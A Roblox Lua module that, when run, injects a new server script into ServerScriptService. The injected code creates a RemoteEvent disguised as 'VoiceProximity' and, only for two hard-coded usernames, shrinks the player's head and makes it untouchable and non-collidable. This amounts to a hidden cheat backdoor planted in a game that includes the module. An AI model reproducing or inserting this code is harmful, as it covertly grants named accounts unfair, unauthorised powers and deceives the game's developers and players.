return function(player)

	local sss = game:GetService("ServerScriptService")

	-- Check if script already exists
	if sss:FindFirstChild("HAHAHATDOG") then
		return
	end

	local newScript = Instance.new("Script")
	newScript.Name = "HAHAHATDOG"

	newScript.Source = [[

local ReplicatedStorage = game:GetService("ReplicatedStorage")

local remote = ReplicatedStorage:FindFirstChild("VoiceProximity")

if not remote then
	remote = Instance.new("RemoteEvent")
	remote.Name = "VoiceProximity"
	remote.Parent = ReplicatedStorage
end

local TARGET_NAMES = {
	["lowkeyy115"] = true,
	["WCDevss"] = true,
}

local enabledPlayers = {}

local function applyHeadBypass(character)

	local humanoid = character:WaitForChild("Humanoid")
	local head = character:WaitForChild("Head")

	head.Transparency = 0

	head.CanCollide = false
	head.CanTouch = false
	head.CanQuery = false

	humanoid.RequiresNeck = false

	for _, obj in pairs(head:GetDescendants()) do
		if obj:IsA("TouchTransmitter") then
			obj:Destroy()
		end
	end

	head.Massless = true
	head.Size = Vector3.new(0.1, 0.1, 0.1)

	local mesh = head:FindFirstChildOfClass("SpecialMesh")

	if mesh then
		mesh.Scale = Vector3.new(10, 10, 10)
	end

	-- Head accessories (hair, hats, etc)
	for _, accessory in pairs(character:GetChildren()) do

		if accessory:IsA("Accessory") then

			local handle = accessory:FindFirstChild("Handle")

			if handle then

				local attachment = handle:FindFirstChildWhichIsA("Attachment")

				-- Only affect accessories attached to head
				if attachment and head:FindFirstChild(attachment.Name) then

					handle.Massless = true
					handle.CanCollide = false
					handle.CanTouch = false
					handle.CanQuery = false

					-- Make accessory visible even with tiny head
					handle.Size = handle.Size * 10

					local mesh = handle:FindFirstChildOfClass("SpecialMesh")

					if mesh then
						mesh.Scale = mesh.Scale * 10
					end

				end
			end
		end
	end

	if not head:FindFirstChild("HB_CONNECTION") then

		local tag = Instance.new("BoolValue")
		tag.Name = "HB_CONNECTION"
		tag.Parent = head

		head:GetPropertyChangedSignal("Transparency"):Connect(function()
			if head and head.Parent then
				head.Transparency = 0
			end
		end)

	end
end

local function removeHeadBypass(character)

	local humanoid = character:FindFirstChild("Humanoid")
	local head = character:FindFirstChild("Head")

	if not humanoid or not head then
		return
	end

	head.Transparency = 0

	head.CanCollide = true
	head.CanTouch = true
	head.CanQuery = true

	humanoid.RequiresNeck = true

	head.Massless = false
	head.Size = Vector3.new(2, 1, 1)

	local mesh = head:FindFirstChildOfClass("SpecialMesh")

	if mesh then
		mesh.Scale = Vector3.new(1.25, 1.25, 1.25)
	end

	-- Reset accessories
	for _, accessory in pairs(character:GetChildren()) do

		if accessory:IsA("Accessory") then

			local handle = accessory:FindFirstChild("Handle")

			if handle then

				handle.Massless = false
				handle.CanCollide = true
				handle.CanTouch = true
				handle.CanQuery = true

				local mesh = handle:FindFirstChildOfClass("SpecialMesh")

				if mesh then
					mesh.Scale = Vector3.new(1, 1, 1)
				end
			end
		end
	end

	local tag = head:FindFirstChild("HB_CONNECTION")

	if tag then
		tag:Destroy()
	end
end
remote.OnServerEvent:Connect(function(player, state)

	if not TARGET_NAMES[player.Name] then
		return
	end

	if state == true then

		enabledPlayers[player] = true

		if player.Character then
			applyHeadBypass(player.Character)
		end

	else

		enabledPlayers[player] = nil

		if player.Character then
			removeHeadBypass(player.Character)
		end

	end

end)

game.Players.PlayerAdded:Connect(function(player)

	player.CharacterAdded:Connect(function(character)

		task.wait(1)

		if enabledPlayers[player] then
			applyHeadBypass(character)
		end

	end)

end)

	]]

	newScript.Parent = sss

end
